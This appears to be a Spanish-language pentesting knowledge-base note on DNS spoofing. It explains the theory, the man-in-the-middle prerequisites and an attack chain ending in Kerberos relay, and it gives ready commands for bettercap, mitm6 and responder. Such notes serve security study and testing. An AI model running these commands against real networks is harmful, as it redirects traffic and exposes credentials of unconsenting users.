# Teoría

El protocolo #DNS (_Domain Name System_) permite la **resolución de nombres de dominio a direcciones IP**.

![[dns.excalidraw|center]]

A diferencia de otros protocolos, DNS **no utiliza multicast ni broadcast**.

# Vulnerabilidad

Para responder a peticiones DNS, primero se necesita **recibirlas mediante técnicas de Man-in-the-Middle** como:

- [[ARP Spoofing]]
- [[DHCPv6 Spoofing]]

Una vez el atacante puede interceptar las consultas DNS, puede establecer un **servidor DNS malicioso** que responda con direcciones IP arbitrarias, redirigiendo el tráfico hacia sistemas controlados por el atacante.

![[dns-spoofing.excalidraw|center]]

Esta técnica es conocida como **DNS Spoofing**.

# Explotación

>[!warning] DNS Spoofing puede causar disrupciones temporales en la red.
>Es altamente recomendado atacar máquinas específicas para minimizar el impacto en el entorno.

Es posible realizar el ataque **después de conseguir una posición de Man-in-the-Middle**:

~~~tabs
tab: bettercap

<span query="codeBlock(_/variables/hacking.md/iface,_/variables/hacking.md/domain, code = # bettercap -iface {{iface}}&#10;&#10;set dns.spoof.domains {{domain}}&#10;set dns.spoof.all true&#10;dns.spoof on, lang = )"></span>
``` 
# bettercap -iface ${IFACE}

set dns.spoof.domains ${DOMAIN}
set dns.spoof.all true
dns.spoof on
```
<span type="end"></span>


tab: mitm6

<span query="codeBlock(_/variables/hacking.md/iface,_/variables/hacking.md/domain, code = mitm6 -i {{iface}} -d {{domain}}, lang = )"></span>
``` 
mitm6 -i ${IFACE} -d ${DOMAIN}
```
<span type="end"></span>

>[!info] También realiza [[DHCPv6 Spoofing]]. No se puede desactivar.


tab: responder

<span query="codeBlock(_/variables/hacking.md/iface, code = responder -I {{iface}}, lang = )"></span>
``` 
responder -I ${IFACE}
```
<span type="end"></span>

>[!note] /etc/responder/Responder.conf

~~~

### Cadenas de ataque

-  [[DHCPv6 Spoofing]] → [[DNS Spoofing]] → Kerberos relay

# Recursos

~~~tabs

tab: Herramientas

| Repositorio | Descripción |
| ---------------------------------------------------- | ---------------------------------------------------------------- |
| [`bettercap`](https://www.kali.org/tools/bettercap/) | Complete, modular, portable and easily extensible MITM framework |
| [`mitm6`](https://www.kali.org/tools/mitm6/) | Pwning IPv4 via IPv6 |
| [`responder`](https://www.kali.org/tools/responder/) | LLMNR/NBT-NS/mDNS poisoner |

~~~
